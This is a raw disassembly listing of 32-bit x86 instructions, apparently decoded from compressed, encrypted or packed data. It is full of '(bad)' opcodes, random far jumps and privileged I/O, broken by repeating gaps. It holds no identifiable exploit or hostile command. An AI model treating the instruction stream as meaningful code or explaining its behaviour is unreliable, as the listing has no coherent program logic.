  422499:	push   esp
  42249a:	jl     0x4224d8
  42249c:	jge    0x422472
  42249e:	mov    bl,0xe3
  4224a0:	and    ebx,DWORD PTR [edx+0x6f]
  4224a3:	xchg   edi,eax
  4224a4:	cmp    esp,esp
  4224a6:	sbb    BYTE PTR [ecx+ebx*4],dl
  4224a9:	inc    sp
  4224ab:	adc    ecx,ebp
  4224ad:	out    dx,al
  4224ae:	js     0x4224b7
  4224b0:	ficom  WORD PTR [edi+eax*4+0x4739d7b3]
  4224b7:	lahf   
  4224b8:	mov    esp,0xda9d74d6
  4224bd:	and    DWORD PTR [eax-0x3b],esp
  4224c0:	(bad)  
  4224c1:	std    
  4224c2:	adc    BYTE PTR [ebx+0x47],ch
  4224c5:	popa   
  4224c6:	and    eax,0x4a8e45c7
  4224cb:	xchg   ch,ch
  4224cd:	outs   dx,DWORD PTR ds:[esi]
  4224ce:	dec    esp
  4224cf:	push   es
  4224d0:	pop    esi
  4224d1:	add    eax,0x1999f8c
  4224d6:	std    
  4224d7:	pop    esp
  4224d8:	add    ecx,DWORD PTR [ebx+ecx*2-0x5e]
  4224dc:	stos   BYTE PTR es:[edi],al
  4224dd:	sbb    ebx,DWORD PTR [esi-0x330d1d5b]
  4224e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e4:	inc    edx
  4224e5:	inc    ebx
  4224e6:	xlat   BYTE PTR ds:[ebx]
  4224e7:	mov    eax,ds:0x5e3c5726
  4224ec:	sub    eax,0xe2fd4a75
  4224f1:	dec    esp
  4224f2:	push   cs
  4224f3:	ss pop ebx
  4224f5:	cmp    al,0x57
  4224f7:	ja     0x4224f0
  4224f9:	push   ss
  4224fa:	jns    0x4224c4
  4224fc:	cmp    eax,0x7608a485
  422501:	adc    bh,BYTE PTR [eax+0x3004278e]
  422507:	mov    ah,0x84
  422509:	pop    edx
  42250a:	(bad)  
  42250b:	push   0xd1141bc
  422510:	stos   BYTE PTR es:[edi],al
  422511:	ds inc edx
  422513:	inc    eax
  422514:	or     al,0x87
  422516:	mov    cl,0x8e
  422518:	pop    ecx
  422519:	sub    BYTE PTR [eax+0x2c],0x77
  42251d:	sub    esp,DWORD PTR [ecx-0x5]
  422520:	or     cl,bl
  422522:	mov    cl,BYTE PTR [esi-0x774d756c]
  422528:	push   esi
  422529:	pop    esi
  42252a:	sbb    DWORD PTR [edx+0x20939515],0x67
  422531:	std    
  422532:	mov    esi,0xe4606e0
  422537:	mov    al,ds:0xe806d03d
  42253c:	jp     0x4224f4
  42253e:	mov    eax,0xcd92c181
  422543:	pop    esi
  422544:	or     al,0x5e
  422546:	ins    BYTE PTR es:[edi],dx
  422547:	inc    eax
  422548:	jg     0x422532
  42254a:	or     BYTE PTR [edi+0x7b53a7f4],cl
  422550:	ficom  WORD PTR [edx]
  422552:	mov    esi,0x91195ee5
  422557:	pop    ebx
  422558:	rol    DWORD PTR [ecx+0x50dbc1ee],cl
  42255e:	jmp    0x944052b5
  422563:	sbb    eax,0x623ec073
  422568:	adc    al,0xd4
  42256a:	loopne 0x422569
  42256c:	fsqrt  
  42256e:	in     al,dx
  42256f:	mov    ds:0xf2120584,eax
  422574:	and    al,0x1
  422576:	xchg   esi,eax
  422577:	div    ebp
  422579:	pop    ecx
  42257a:	add    eax,0x85f36d72
  42257f:	dec    edi
  422580:	test   DWORD PTR [esi],esi
  422582:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422583:	mov    ebp,0x96ee04c8
  422588:	mov    ah,BYTE PTR [edx+0x2e]
  42258b:	lods   al,BYTE PTR ds:[esi]
  42258c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42258d:	sub    al,0x47
  42258f:	scas   eax,DWORD PTR es:[edi]
  422590:	mov    ah,0x0
	...
  4225f2:	add    BYTE PTR [eax],al
  4225f4:	call   0xfa77:0xbf778fae
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0x2df2a2f8]
  422602:	inc    ebp
  422603:	test   esi,ebx
  422605:	outs   dx,BYTE PTR ds:[esi]
  422606:	add    DWORD PTR [eax],eax
  422608:	add    eax,0x45000001
  42260d:	jge    0x422622
  42260f:	and    BYTE PTR [ebx-0x3a],dh
  422612:	inc    ebx
  422613:	mov    edi,0x74f46a74
  422618:	mov    al,0xc6
  42261a:	sub    eax,0xe064f6ae
  42261f:	mov    ah,0xc0
  422621:	sub    al,0xb2
  422623:	mov    WORD PTR [ecx-0x734f5375],gs
  422629:	jge    0x422654
  42262b:	pop    edi
  42262c:	jns    0x4225cc
  42262e:	retf   0xcd17
  422631:	xchg   BYTE PTR [ebp-0x764ef73d],bl
  422637:	jb     0x422617
  422639:	(bad)  
  42263a:	loope  0x4225f9
  42263c:	aad    0xf2
  42263e:	mov    edi,0xa3492d7
  422643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422644:	inc    edx
  422645:	or     bl,BYTE PTR [esp+edx*1]
  422648:	repz jb 0x4226ad
  42264b:	add    BYTE PTR [eax-0x26],dl
  42264e:	cmc    
  42264f:	ret    
  422650:	sub    BYTE PTR [edi],cl
  422652:	pop    esp
  422653:	test   DWORD PTR [esi+0xc726386],0x1cca125f
  42265d:	cmp    eax,0xfd58218a
  422662:	enter  0xa1bb,0x83
  422666:	scas   eax,DWORD PTR es:[edi]
  422667:	adc    cl,bh
  422669:	inc    esi
  42266a:	add    BYTE PTR gs:[ecx+0x42],ah
  42266e:	sub    cl,0x2c
  422671:	push   edx
  422672:	in     ax,0x32
  422675:	mov    bl,0xfd
  422677:	pop    esp
  422678:	mov    DWORD PTR [eax+0x3f92245a],esp
  42267e:	xchg   DWORD PTR [edx-0x3306761e],ebp
  422684:	or     esp,DWORD PTR [eax+0x11]
  422687:	mov    esp,0xea0e051b
  42268c:	add    DWORD PTR [esi-0x8],ecx
  42268f:	lods   eax,DWORD PTR ds:[esi]
  422690:	aad    0x4b
  422692:	pop    ss
  422693:	cli    
  422694:	imul   edx,DWORD PTR [ecx+ebp*4+0x669d3e0b],0x3b
  42269c:	and    DWORD PTR [edi+edi*1+0x7bf1d5d5],edx
  4226a3:	not    BYTE PTR [ecx-0x1c445138]
  4226a9:	pop    ecx
  4226aa:	(bad)  
  4226ab:	mov    bh,0xa2
  4226ad:	lock add ah,BYTE PTR [ebx]
  4226b0:	retf   
  4226b1:	or     DWORD PTR ds:0xada8045,ebx
  4226b7:	mov    dh,0x58
  4226b9:	scas   eax,DWORD PTR es:[edi]
  4226ba:	repz mov dh,0x19
  4226bd:	push   edx
  4226be:	aam    0x71
  4226c0:	pop    esp
  4226c1:	mov    BYTE PTR [ebx-0x6c25b687],bl
  4226c7:	or     ecx,0x2c4599fa
  4226cd:	or     al,0xf5
  4226cf:	pop    ss
  4226d0:	aam    0x47
  4226d2:	mov    dl,0x6d
  4226d4:	lods   eax,DWORD PTR ds:[esi]
  4226d5:	mov    edx,0x356b73c
  4226da:	fcomp  QWORD PTR [ecx]
  4226dc:	bound  ebp,QWORD PTR [eax]
  4226de:	shl    dh,1
  4226e0:	mov    al,0x24
  4226e2:	or     ebp,DWORD PTR [ecx-0x3b069ff8]
  4226e8:	rol    DWORD PTR [edx],0xe1
  4226eb:	mov    ds:0x3b050448,al
  4226f0:	sbb    esp,ebx
  4226f2:	ror    DWORD PTR [ebp+ecx*2+0x7bbda00a],cl
  4226f9:	dec    ebp
  4226fa:	or     al,0xc7
  4226fd:	retf   0x4c97
  422700:	dec    edx
  422701:	pusha  
  422702:	sub    bl,BYTE PTR [ebp+edi*8-0x6d]
  422706:	sbb    ecx,edi
  422708:	ins    BYTE PTR es:[edi],dx
  422709:	or     eax,0x51b63c46
  42270e:	test   esi,eax
  422710:	in     al,0x0
	...
  422772:	add    BYTE PTR [eax],al
  422774:	daa    
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0xfa7f01c8
  422781:	loope  0x42272b
  422783:	cmp    esp,ebx
  422785:	outs   dx,DWORD PTR ds:[esi]
  422786:	add    DWORD PTR [eax],eax
  422788:	add    eax,0xcb000001
  42278d:	xor    eax,0x618bce9d
  422792:	in     al,0x61
  422794:	and    esp,DWORD PTR [esi+esi*8]
  422797:	mov    al,0xa2
  422799:	cmp    eax,0xa5562a01
  42279e:	pcmpgtw mm3,QWORD PTR [ebx]
  4227a1:	pop    esi
  4227a2:	mov    cl,0x7a
  4227a4:	adc    DWORD PTR [eax],0xffffffed
  4227a7:	adc    ah,al
  4227a9:	push   ebx
  4227aa:	ss gs mov ah,0x66
  4227ae:	(bad)  
  4227af:	fisub  WORD PTR [ebx+0x6c]
  4227b2:	cmc    
  4227b3:	popf   
  4227b4:	dec    ebp
  4227b5:	fdivr  st(1),st
  4227b7:	cmp    bl,dh
  4227b9:	pop    edx
  4227ba:	fldcw  WORD PTR [ebx-0x39ec4d52]
  4227c0:	aam    0x5f
  4227c2:	inc    esp
  4227c3:	xor    dl,BYTE PTR ds:0xb93ac447
  4227c9:	adc    BYTE PTR [edx],ch
  4227cb:	adc    DWORD PTR [edi+0x7e],edi
  4227ce:	test   eax,0x14ea4127
  4227d3:	cli    
  4227d4:	test   DWORD PTR [edx+0x62ab5bd],edx
  4227da:	shr    BYTE PTR [ebp-0x693766aa],0xe0
  4227e1:	mov    ds:0xb2697ca3,al
  4227e6:	sub    edx,edx
  4227e8:	int3   
  4227e9:	icebp  
  4227ea:	retf   
  4227eb:	cli    
  4227ec:	and    ah,bl
  4227ee:	dec    eax
  4227ef:	scas   al,BYTE PTR es:[edi]
  4227f0:	add    BYTE PTR [edx],dh
  4227f2:	mov    ds:0xdbb432c6,al
  4227f7:	sub    ch,BYTE PTR [ebx-0x7c884f2]
  4227fd:	mov    bl,0x43
  4227ff:	adc    eax,0x3780fa9
  422804:	and    DWORD PTR [esi+eax*2],edi
  422807:	xor    eax,0xdf0b09b2
  42280c:	test   al,0xb7
  42280e:	repz or al,0xdc
  422811:	(bad)  
  422812:	cmp    BYTE PTR [ebx+0x73],ch
  422815:	imul   BYTE PTR [ebx+eiz*1]
  422818:	(bad)
  42281b:	inc    esp
  42281c:	dec    edi
  42281d:	iret   
  42281e:	xchg   esi,eax
  42281f:	call   0x401a26e5
  422824:	lods   al,BYTE PTR ds:[esi]
  422825:	cmp    esi,DWORD PTR [eax-0x3c]
  422828:	ror    BYTE PTR [ebx-0x3d],1
  42282b:	sub    esp,ecx
  42282d:	ss sbb al,0x1a
  422830:	xor    eax,0xa00c0e54
  422835:	dec    esi
  422836:	data16 aas 
  422838:	xor    DWORD PTR [edi],0xda828388
  42283e:	outs   dx,DWORD PTR ds:[esi]
  42283f:	ss dec eax
  422841:	jmp    0x21772032
  422846:	jns    0x422803
  422848:	test   DWORD PTR [ecx+0x1d],esp
  42284b:	sbb    DWORD PTR [eax],eax
  42284d:	inc    edi
  42284e:	retf   0x4e3e
  422851:	ins    DWORD PTR es:[edi],dx
  422852:	dec    edi
  422853:	xor    edi,DWORD PTR [ebp+0x791f069a]
  422859:	mov    bl,0xfa
  42285b:	(bad)  
  42285c:	jle    0x42287f
  42285e:	out    0xec,eax
  422860:	rcr    DWORD PTR [ebx-0x75],cl
  422863:	les    eax,FWORD PTR [ebx]
  422865:	pushf  
  422866:	and    eax,0xca686ad4
  42286b:	xchg   edi,eax
  42286c:	dec    esi
  42286d:	sbb    al,0x90
  42286f:	lock pop esi
  422871:	jne    0x422869
  422873:	sbb    eax,0x9cf8bac0
  422878:	scas   al,BYTE PTR es:[edi]
  422879:	and    esp,DWORD PTR [edi+0x44]
  42287c:	and    DWORD PTR fs:[esi+esi*2],edx
  422880:	pop    ss
  422881:	mov    esi,0x69447814
  422886:	mov    gs,WORD PTR [esi+0x44abb878]
  42288c:	sbb    ch,BYTE PTR [ecx+edi*8-0x10]
  422890:	fiadd  DWORD PTR [eax]
	...
  4228f2:	add    BYTE PTR [eax],al
  4228f4:	int    0x39
  4228f6:	mov    eax,0xef97fc97
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x4228e5
  422901:	push   edi
  422902:	rcr    BYTE PTR [edx+0x170e8],1
  422908:	add    eax,0xba000001
  42290d:	inc    edi
  42290e:	clc    
  42290f:	out    dx,al
  422910:	and    DWORD PTR [ebx],0x64
  422913:	sub    DWORD PTR [ecx],ebx
  422915:	stc    
  422916:	xor    eax,0x3b0d707f
  42291b:	pop    ebp
  42291c:	or     esp,edi
  42291e:	in     al,dx
  42291f:	iret   
  422920:	add    eax,0x1ac4db33
  422925:	js     0x4228f8
  422927:	pop    esp
  422928:	adc    eax,DWORD PTR [ecx+0x28]
  42292b:	or     eax,0xd59d2efa
  422930:	or     BYTE PTR [ebx-0x72c759e0],0xd
  422937:	add    edi,DWORD PTR [ebp+0xfff3848]
  42293d:	mov    ah,0x78
  42293f:	outs   dx,BYTE PTR ds:[esi]
  422940:	mov    eax,ds:0xcf1db743
  422945:	daa    
  422946:	in     al,0x59
  422948:	pop    edx
  422949:	xlat   BYTE PTR ds:[ebx]
  42294a:	xchg   cl,dl
  42294c:	sbb    edi,eax
  42294e:	(bad)  
  42294f:	addr16 aaa 
  422951:	sbb    al,0x2
  422953:	sub    eax,0xe52adc7d
  422958:	sbb    eax,0xc73da2ce
  42295d:	jmp    0xfa20:0x888c12ce
  422964:	mov    dh,0x3e
  422966:	mov    ds:0xc80263b,al
  42296b:	stc    
  42296c:	jbe    0x422921
  42296e:	sub    DWORD PTR [esi+0x5],esp
  422971:	sbb    al,0x15
  422973:	jmp    0x4229b8
  422975:	push   edi
  422976:	push   cs
  422977:	inc    ecx
  422978:	xor    al,0x57
  42297a:	mov    dl,0xc0
  42297c:	pop    ecx
  42297d:	imul   edi,DWORD PTR [eax+0x3f],0xe5082310
  422984:	xchg   esi,eax
  422985:	push   esp
  422986:	test   DWORD PTR [ecx+0x4c],ecx
  422989:	pop    edx
  42298a:	jne    0x422969
  42298c:	mov    al,0x67
  42298e:	mov    BYTE PTR [bp+si],ch
  422991:	stc    
  422992:	pop    ebp
  422993:	jg     0x42297a
  422995:	pop    ebp
  422996:	xchg   BYTE PTR [ecx-0x5321ab66],al
  42299c:	mov    ds:0xe3625c4a,eax
  4229a1:	push   ebp
  4229a2:	cmp    cl,BYTE PTR ds:0xeb9bcd33
  4229a8:	adc    edi,ebx
  4229aa:	daa    
  4229ab:	mov    es,WORD PTR ds:0x7525adcd
  4229b1:	leave  
  4229b2:	mov    bh,BYTE PTR [ebx]
  4229b4:	xchg   BYTE PTR [ebx],dl
  4229b6:	imul   eax,ecx,0x4612d59c
  4229bc:	enter  0xc125,0xd0
  4229c0:	cwde   
  4229c1:	lahf   
  4229c2:	mov    al,ds:0x51452d95
  4229c7:	xchg   esi,eax
  4229c8:	test   al,0x65
  4229ca:	lods   al,BYTE PTR ds:[esi]
  4229cb:	mov    eax,esp
  4229cd:	jo     0x4229fe
  4229cf:	push   ss
  4229d0:	or     ah,cl
  4229d2:	outs   dx,BYTE PTR ds:[esi]
  4229d3:	ins    DWORD PTR es:[edi],dx
  4229d4:	xchg   edi,eax
  4229d5:	aam    0x29
  4229d7:	xchg   edx,eax
  4229d8:	popf   
  4229d9:	ins    BYTE PTR es:[edi],dx
  4229da:	mov    ebp,0x20cec12f
  4229df:	jge    0x4229e4
  4229e1:	push   esi
  4229e2:	push   ds
  4229e3:	or     eax,0x11ccdf76
  4229e8:	mov    dh,0x35
  4229ea:	int3   
  4229eb:	cli    
  4229ec:	adc    bh,BYTE PTR [edx+0x2022f05e]
  4229f2:	mov    al,0x3a
  4229f4:	lods   eax,DWORD PTR ds:[esi]
  4229f5:	mov    eax,0x5b62e215
  4229fa:	in     al,0x6e
  4229fc:	pop    esi
  4229fd:	arpl   cx,ax
  4229ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a00:	fild   WORD PTR [ebp-0x32328cbf]
  422a06:	pop    ss
  422a07:	leave  
  422a08:	inc    esp
  422a09:	xor    eax,0xc764bd67
  422a0e:	loope  0x4229c0
  422a10:	sbb    al,BYTE PTR [eax]
	...
  422a72:	add    BYTE PTR [eax],al
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	mov    eax,ecx
  422a82:	adc    cl,BYTE PTR [ecx]
  422a84:	in     eax,dx
  422a85:	jno    0x422a88
  422a87:	add    BYTE PTR ds:0xd3000001,al
  422a8d:	ret    
  422a8e:	xchg   esp,eax
  422a8f:	in     al,dx
  422a90:	jmp    0x68cdbcf5
  422a95:	retf   0x473b
  422a98:	pop    es
  422a99:	mov    WORD PTR [edi-0x185a665d],es
  422a9f:	inc    ebx
  422aa0:	sub    eax,0x7ea3b04a
  422aa5:	js     0x422a31
  422aa7:	int3   
  422aa8:	fdiv   QWORD PTR [ecx+0x5]
  422aab:	sbb    edx,DWORD PTR [edi+0x4]
  422aae:	enter  0x1c79,0xe7
  422ab2:	jne    0x422ac4
  422ab4:	xchg   edi,eax
  422ab5:	mov    eax,0x4cfd7237
  422aba:	pop    ss
  422abb:	jmp    0xba60:0x1d3f165f
  422ac2:	test   eax,ecx
  422ac4:	scas   al,BYTE PTR es:[edi]
  422ac5:	jnp    0x422b42
  422ac7:	rcl    BYTE PTR [ebx-0x2725a85f],1
  422acd:	push   0xffffffb2
  422acf:	inc    edi
  422ad0:	mov    edi,0x2089ecd8
  422ad5:	fimul  WORD PTR [esi]
  422ad7:	(bad)
  422ada:	mov    eax,0x826a2c3e
  422adf:	icebp  
  422ae0:	ret    0x1867
  422ae3:	pop    ecx
  422ae4:	add    DWORD PTR [edi-0x320c7eb],ebp
  422aea:	xor    esi,DWORD PTR [ebp-0x1273d80f]
  422af0:	jno    0x422b60
  422af2:	fdivp  st(5),st
  422af4:	lds    edx,FWORD PTR [eax+0x4d004631]
  422afa:	fldcw  WORD PTR [edi]
  422afc:	scas   al,BYTE PTR es:[edi]
  422afd:	xchg   ebx,eax
  422afe:	lods   eax,DWORD PTR ds:[esi]
  422aff:	dec    eax
  422b00:	mov    edx,0xd678b34f
  422b05:	lock cmc 
  422b07:	int3   
  422b08:	mov    dh,bl
  422b0a:	inc    ecx
  422b0b:	sbb    al,ah
  422b0d:	and    DWORD PTR [eax-0x2c2cfa8],edx
  422b13:	dec    ebp
  422b14:	test   BYTE PTR [ebx+0xf],ah
  422b17:	fld    DWORD PTR [ebp-0xa]
  422b1a:	js     0x422b21
  422b1c:	jmp    0xf9f378c4
  422b21:	sub    eax,ebp
  422b23:	xchg   esp,eax
  422b24:	pop    eax
  422b25:	lods   al,BYTE PTR ds:[esi]
  422b26:	outs   dx,BYTE PTR ds:[esi]
  422b27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b28:	inc    edx
  422b29:	add    bl,BYTE PTR [edx-0x5aeaba09]
  422b2f:	into   
  422b30:	xchg   ebp,eax
  422b31:	mov    ebp,0x20b1c1cd
  422b36:	enter  0xd87e,0x6e
  422b3a:	sbb    cl,BYTE PTR [eax]
  422b3c:	jmp    0x1400:0xa4dcd15a
  422b43:	in     al,dx
  422b44:	sahf   
  422b45:	adc    edx,esi
  422b47:	mov    DWORD PTR [ebp+0x51],eax
  422b4a:	dec    ecx
  422b4b:	iret   
  422b4c:	and    edx,0xbd59ccca
  422b52:	sub    esp,esp
  422b54:	int    0xeb
  422b56:	inc    edx
  422b57:	mov    dl,0xb7
  422b59:	mov    cl,0xea
  422b5b:	xchg   edx,ebx
  422b5d:	std    
  422b5e:	pop    edi
  422b5f:	mov    edx,0x5772c268
  422b64:	leave  
  422b65:	cdq    
  422b66:	dec    ecx
  422b67:	(bad)  
  422b68:	push   esp
  422b69:	push   ebp
  422b6a:	es sbb eax,0xd268b7cb
  422b70:	jb     0x422b92
  422b72:	cmc    
  422b73:	outs   dx,BYTE PTR ds:[esi]
  422b74:	mov    edi,0x6c80a64c
  422b79:	scas   eax,DWORD PTR es:[edi]
  422b7a:	clc    
  422b7b:	inc    edi
  422b7c:	jnp    0x422bdd
  422b7e:	icebp  
  422b7f:	js     0x422b56
  422b81:	sub    eax,0x7c108d69
  422b86:	pop    ss
  422b87:	aas    
  422b88:	test   BYTE PTR [ebp+0x1c],0x59
  422b8c:	shl    DWORD PTR [esi],1
  422b8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b8f:	cmp    BYTE PTR [esi],bl
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x556db264]
  422c02:	mov    al,ds:0x172f221
  422c07:	add    BYTE PTR ds:0xa0000001,al
  422c0d:	test   ebx,ebp
  422c0f:	push   edi
  422c10:	fs popf 
  422c12:	pop    es
  422c13:	(bad)  [edi+0x10]
  422c16:	push   ebp
  422c17:	xor    ah,dh
  422c19:	dec    esp
  422c1a:	jl     0x422bd1
  422c1c:	inc    eax
  422c1d:	cmp    BYTE PTR [esi],bh
  422c1f:	mov    ecx,0x11ef0b35
  422c24:	add    esi,DWORD PTR [edi-0x5730dc8]
  422c2a:	add    BYTE PTR [ebx-0x14],ah
  422c2d:	in     eax,dx
  422c2e:	scas   eax,DWORD PTR es:[edi]
  422c2f:	push   eax
  422c30:	es loop 0x422c37
  422c33:	mov    esi,0xa9bd4cf7
  422c38:	imul   esi,edx,0x3e
  422c3b:	pop    ecx
  422c3c:	inc    edx
  422c3d:	mov    ah,0x37
  422c3f:	retf   
  422c40:	nop
  422c41:	retf   0x6822
  422c44:	and    BYTE PTR [edx-0x4c],bl
  422c47:	lahf   
  422c48:	and    bh,BYTE PTR [esi-0x785e615e]
  422c4e:	mov    ebp,0x45b081e4
  422c53:	inc    eax
  422c54:	mov    edi,0x433eae74
  422c59:	adc    BYTE PTR ds:[edx-0x66197452],cl
  422c60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c61:	add    BYTE PTR [ebx-0x1efeb43b],0x1
  422c68:	push   es
  422c69:	pop    ebp
  422c6a:	cmp    ebx,ebx
  422c6c:	mov    al,0xf2
  422c6e:	ins    DWORD PTR es:[edi],dx
  422c6f:	sub    eax,0xa922265f
  422c74:	mov    edi,0xe2bc1e5
  422c79:	mov    BYTE PTR [edx],bh
  422c7b:	imul   DWORD PTR [edi-0x1e630214]
  422c81:	xchg   edi,eax
  422c82:	mov    cs,WORD PTR [edx-0x707828a8]
  422c88:	add    esp,edi
  422c8a:	push   ebx
  422c8b:	push   ebp
  422c8c:	dec    edi
  422c8d:	test   al,0xcc
  422c8f:	fwait
  422c90:	test   BYTE PTR [edx+0x1cf9a164],bh
  422c96:	xor    BYTE PTR [ecx+0x5c9b6a62],bh
  422c9c:	inc    eax
  422c9d:	add    BYTE PTR [ebp+ebx*1-0x22],cl
  422ca1:	jmp    0x4878:0x79eed2
  422ca8:	jle    0x422ceb
  422caa:	push   ebp
  422cab:	ds mov esi,0x2271f8d4
  422cb1:	pop    es
  422cb2:	sbb    ebp,esp
  422cb4:	scas   al,BYTE PTR es:[edi]
  422cb5:	(bad)  
  422cb6:	sub    eax,0xa3bb9f05
  422cbb:	out    dx,al
  422cbc:	call   0x1073:0x24953c55
  422cc3:	mov    ds:0xf86bbcb,eax
  422cc8:	xchg   DWORD PTR [eax],esi
  422cca:	arpl   dx,cx
  422ccc:	adc    BYTE PTR [ecx+0x5b],ah
  422ccf:	in     eax,0xbf
  422cd1:	mov    esi,0x87b23eb1
  422cd6:	les    eax,FWORD PTR [eax]
  422cd8:	xor    ebx,edi
  422cda:	mov    ecx,0xabd3af4f
  422cdf:	fldenv [edi-0x76]
  422ce2:	push   0xffffffd9
  422ce4:	add    cl,BYTE PTR [ebp-0x7c]
  422ce7:	cmp    DWORD PTR [ebx],eax
  422ce9:	mov    esi,0x38592fd9
  422cee:	sbb    ebx,esi
  422cf0:	mov    BYTE PTR [edi],al
  422cf2:	cmp    bh,dh
  422cf4:	jo     0x422d3b
  422cf6:	loope  0x422d56
  422cf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cf9:	loope  0x422d4a
  422cfb:	cli    
  422cfc:	cmp    edx,DWORD PTR ds:0xf13bddd0
  422d02:	xchg   DWORD PTR [edx+0x1f43268f],edi
  422d08:	pop    es
  422d09:	mov    ds:0xfa950f47,al
  422d0e:	cmp    edi,DWORD PTR [ebx]
  422d10:	fld    QWORD PTR [eax]
	...
  422d72:	add    BYTE PTR [eax],al
  422d74:	mov    edi,0x626d60bd
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    esi,DWORD PTR [ebx+0x70]
  422d82:	jmp    0x422d8f
  422d84:	div    DWORD PTR [ebx+0x1]
  422d87:	add    BYTE PTR ds:0x18000001,al
  422d8d:	dec    BYTE PTR [eax+0x7b]
  422d90:	push   DWORD PTR [eax+0x75]
  422d93:	pushf  
  422d94:	pop    edx
  422d95:	and    al,0xd5
  422d97:	shl    BYTE PTR [eax+edi*8+0x74],cl
  422d9b:	cmp    bl,BYTE PTR [eax-0x4e454198]
  422da1:	jmp    0x422d80
  422da3:	sbb    bh,dh
  422da5:	sub    BYTE PTR [eax-0x14fefb8b],bh
  422dab:	dec    esp
  422dac:	and    al,BYTE PTR [ecx*4+0x12ba7bac]
  422db3:	dec    ebp
  422db4:	pop    ecx
  422db5:	(bad)  
  422db6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422db7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422db8:	push   ds
  422db9:	xor    ebx,DWORD PTR [ebx-0x2b]
  422dbc:	aam    0x1f
  422dbe:	ja     0x422e34
  422dc0:	mov    eax,0x7d654a32
  422dc5:	jmp    0x490:0xf10d23e8
  422dcc:	ret    0x4c18
  422dcf:	mov    ecx,0x94f8f61d
  422dd4:	adc    bl,BYTE PTR [edx-0x370e9cd5]
  422dda:	aaa    
  422ddb:	adc    DWORD PTR [edi+0x31],ecx
  422dde:	sub    eax,0xd0efbfa9
  422de3:	push   esp
  422de4:	jle    0x422dd3
  422de6:	mov    fs,WORD PTR [edx]
  422de8:	push   0x6e55394b
  422ded:	push   edi
  422dee:	push   eax
  422def:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422df0:	cmp    DWORD PTR [eax],0x43d36185
  422df6:	mov    bh,0x7f
  422df8:	ins    BYTE PTR es:[edi],dx
  422df9:	sar    BYTE PTR [ebx-0x6d],1
  422dfc:	daa    
  422dfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dfe:	cmp    ch,BYTE PTR [ebp-0x3f]
  422e01:	or     eax,0xd291b694
  422e06:	rcr    BYTE PTR [ecx-0x113db6a2],cl
  422e0c:	call   0xf349:0x133c536a
  422e13:	mov    dl,0x64
  422e15:	lods   eax,DWORD PTR ds:[esi]
  422e16:	adc    ebx,DWORD PTR [esi+0x2affab07]
  422e1c:	cmp    esp,DWORD PTR [edx+0x2d]
  422e1f:	push   es
  422e20:	ss pusha 
  422e22:	clc    
  422e23:	add    BYTE PTR [ebp+0x6],ah
  422e26:	(bad)  
  422e27:	repnz pop esi
  422e29:	(bad)  
  422e2b:	into   
  422e2c:	jo     0x422e5e
  422e2e:	ins    BYTE PTR es:[edi],dx
  422e2f:	jo     0x422e5b
  422e31:	div    cl
  422e33:	test   eax,0x40e5284e
  422e38:	or     edi,DWORD PTR [eax-0x2abcc57d]
  422e3e:	mov    cl,0x54
  422e40:	cs xchg edx,eax
  422e42:	pop    ds
  422e43:	xor    ebp,DWORD PTR [edi]
  422e45:	sahf   
  422e46:	nop
  422e47:	mov    WORD PTR [ecx],?
  422e49:	out    0xc8,eax
  422e4b:	shl    BYTE PTR [esi+0x14],1
  422e4e:	add    DWORD PTR [edx],edx
  422e50:	sar    BYTE PTR [ecx-0x10552538],0xf0
  422e57:	les    ebp,FWORD PTR [esi+eax*4+0x49a452e6]
  422e5e:	xor    al,BYTE PTR [ebx-0x2f9a3e21]
  422e64:	cmp    DWORD PTR [ecx+0x5a],esp
  422e67:	adc    al,0xc1
  422e69:	fadd   QWORD PTR [esi+edi*2+0xfd18c88]
  422e70:	add    dh,BYTE PTR [ecx+0x33]
  422e73:	and    al,0x52
  422e75:	mov    fs,eax
  422e77:	xor    esi,eax
  422e79:	jl     0x422eae
  422e7b:	icebp  
  422e7c:	test   DWORD PTR [ecx+ebx*8],esp
  422e7f:	sub    al,bh
  422e81:	mov    WORD PTR [edx+ebp*8],0x9f19
  422e87:	xor    DWORD PTR [esi],ebp
  422e89:	mov    ch,0x67
  422e8b:	test   eax,0x94db8127
  422e90:	test   DWORD PTR [eax],eax
	...
  422ef2:	add    BYTE PTR [eax],al
  422ef4:	adc    DWORD PTR [ebp-0x78],0x19
  422ef8:	(bad)  
  422efa:	xchg   ebx,eax
  422efb:	fisttp WORD PTR [eax]
  422efd:	mov    eax,0x7166ca33
  422f02:	mov    bl,0x9a
  422f04:	cld    
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR ds:0x33000001,al
  422f0d:	fst    st(2)
  422f0f:	mov    DWORD PTR [esi-0x3d57a382],edi
  422f15:	adc    BYTE PTR [eax+0x0],bh
  422f18:	add    eax,0x8cadee10
  422f1d:	pop    eax
  422f1e:	repnz mov eax,0x10bf7697
  422f24:	inc    ebx
  422f25:	push   ecx
  422f26:	mov    bl,0x4d
  422f28:	into   
  422f29:	dec    edi
